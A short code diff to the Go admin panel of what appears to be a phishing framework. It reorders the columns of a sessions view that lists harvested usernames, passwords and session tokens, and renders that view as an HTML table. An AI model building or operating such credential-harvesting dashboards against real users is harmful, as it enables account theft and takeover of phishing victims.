@@ -23,7 +23,7 @@ func (a *AdminPanel) handleSessions(w http.ResponseWriter, r *http.Request) {
 
 	//terminal.go 339
 
-	cols := []string{"id", "phishlet", "username", "password", "tokens", "landing url", "remote ip", "time"}
+	cols := []string{"id", "phishlet", "username", "password", "tokens", "remote ip", "landing url", "time"}
 	sessions, err := a.db.ListSessions()
 	if err != nil {
 		panic(err)
@@ -41,7 +41,7 @@ func (a *AdminPanel) handleSessions(w http.ResponseWriter, r *http.Request) {
 			rows = append(rows, row)
 		}
 
-		body = AsTable(cols, rows)
+		body = AsHTMLTable(cols, rows)
 	}
 
 	w.WriteHeader(http.StatusOK)
